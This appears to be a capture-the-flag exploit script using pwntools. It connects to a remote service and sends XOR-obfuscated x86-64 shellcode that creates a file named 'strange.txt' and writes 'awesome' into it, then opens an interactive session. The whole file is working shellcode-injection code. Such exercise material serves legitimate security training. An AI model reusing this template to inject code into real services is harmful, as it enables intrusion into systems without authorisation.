#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p=remote('157.245.88.100', 7779)
sc=asm('''
    push 0x1010101 ^ 0x747874
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x2e65676e61727473
    push rax
    mov rdi, rsp
    mov rsi, 0x1ff
    /* call creat() */
    mov rax, SYS_creat /* 0x55 */
    syscall

    mov rdi, rax

    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x656d6f73657761
    xor [rsp], rax
    mov rsi, rsp
    mov rdx, 0x7
    /* call write() */
    mov rax, SYS_write /* 1 */
    syscall

    /* stack balance*/
    pop rcx
    pop rcx
    pop rcx

    ret
    ''')

p.sendline(sc)

p.interactive()
